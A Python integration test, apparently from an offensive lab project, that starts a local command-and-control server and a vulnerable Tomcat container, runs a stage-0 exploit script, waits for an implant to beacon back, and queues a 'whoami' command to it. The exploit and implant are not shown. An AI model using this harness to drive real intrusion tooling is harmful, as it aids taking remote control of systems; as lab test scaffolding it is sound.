# import subprocess
# import time
# import requests

# def test_stage0_exploit():
#     """
#     Test to ensure stage0_exploit.py triggers implant.py and communicates with C2.
#     """
#     # Start the vulnerable container
#     vuln_container = subprocess.Popen(["docker", "run", "--rm", "-d", "vuln-container"], stdout=subprocess.PIPE)
#     container_id = vuln_container.stdout.read().decode().strip()
#     assert container_id, "Failed to start vulnerable container"

#     try:
#         # Run the stage0_exploit.py script
#         exploit_process = subprocess.run(["python3", "stage0_exploit.py"], check=True)
#         assert exploit_process.returncode == 0, "stage0_exploit.py failed to execute"

#         # Wait for the implant to communicate with the C2 server
#         timeout = 90  # seconds
#         start_time = time.time()
#         beacon_received = False

#         while time.time() - start_time < timeout:
#             try:
#                 # May need to adjust the URL
#                 response = requests.get("http://127.0.0.1:8000/beacon")
#                 if response.status_code == 200 and "beacon" in response.json():
#                     beacon_received = True
#                     break
#             except requests.RequestException:
#                 pass
#             time.sleep(5)  # Poll every 5 seconds

#         assert beacon_received, "Implant beacon did not arrive at C2 within 90 seconds"

#     finally:
#         # Clean up: Stop the vulnerable container
#         subprocess.run(["docker", "stop", container_id], check=False)

# tests/test_integration.py

import subprocess
import time
import requests

def wait_for_beacon(timeout=90):
    """
    Poll the C2 server for a new session ID up to `timeout` seconds.
    Requires you to have added /admin/sessions in your c2_server.py
    """
    url = "http://localhost:8000/admin/sessions"
    for _ in range(timeout):
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                sessions = r.json()
                if isinstance(sessions, list) and sessions:
                    return sessions[0]
        except requests.exceptions.RequestException:
            pass
        time.sleep(1)
    return None

def test_full_exploit_chain():
    # 1. Bring up C2 server and vulnerable lab
    c2 = subprocess.Popen(["python3", "c2/c2_server.py"])
    time.sleep(2)  # give C2 a moment to start
    subprocess.run(["docker-compose", "up", "-d", "springlab"], check=True)
    time.sleep(10)  # allow Tomcat to deploy

    # 2. Run your exploit (non‐interactive!)
    result = subprocess.run(
        ["python3", "exploit/stage0_exploit.py", "http://localhost:8080/"],
        capture_output=True,
        text=True,
        check=False
    )
    assert result.returncode == 0, (
        "Exploit script failed:\n" +
        result.stderr
    )

    # 3. Wait for the implant to handshake and create a session
    sid = wait_for_beacon(timeout=90)
    assert sid is not None, "No implant session appeared in C2 within 90 s"

    # 4. (Optional) enqueue a simple task and verify /images/logo.png returns 204
    enqueue = requests.post(
        "http://localhost:8000/admin/enqueue",
        json={"sid": sid, "cmd": "whoami"}
    )
    assert enqueue.status_code == 200

    # Now you know the endpoint exists, and you could test implant fetching:
    # resp = requests.get("http://localhost:8000/images/logo.png", headers={"X-Session-ID": sid})
    # assert resp.status_code == 200 or resp.status_code == 204

    # Teardown
    subprocess.run(["docker-compose", "down", "-v"])
    c2.terminate()
